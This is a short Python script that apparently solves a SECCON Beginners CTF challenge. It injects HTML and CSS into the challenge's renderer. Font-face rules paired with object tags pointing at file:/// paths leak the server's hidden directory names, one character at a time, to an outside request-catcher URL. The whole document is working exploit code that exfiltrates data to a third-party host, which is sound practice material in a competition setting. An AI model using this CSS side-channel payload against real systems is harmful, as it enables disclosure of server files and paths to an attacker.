import string
import requests

LEAK_URL = "https://end6km9xnaufp.x.pipedream.net"  # Your server URL here

flag_path = ""  # Add leaked flag path here (e.g. "1/2/3/a/b/c/")
# flag_path = "q/c/j/6/p/f/v/b/e/k/8/u/8/4/d/g/f/f/1/l/"

_css = ""
_object = ""
for c in string.ascii_lowercase + string.digits:
    _css += f"""
    @font-face{{
        font-family: "Satoki{c}";
        src: url("{LEAK_URL}/?no=file:///var/www/htmls/ctf/{flag_path}{c}/");
        unicode-range: U+0053;
    }}
    #leak{c}{{
        font-family: "Satoki{c}";
    }}
    """
    _object += f"""
    <object id="leak{c}" data="file:///var/www/htmls/ctf/{flag_path}{c}/">Satoki</object>
    """

html = f"""
<html>
    <style>
    {_css}
    </style>
    {_object}
</html>
"""

res = requests.post("https://htmls.beginners.seccon.games", data={"html": html})
assert res.status_code == 200
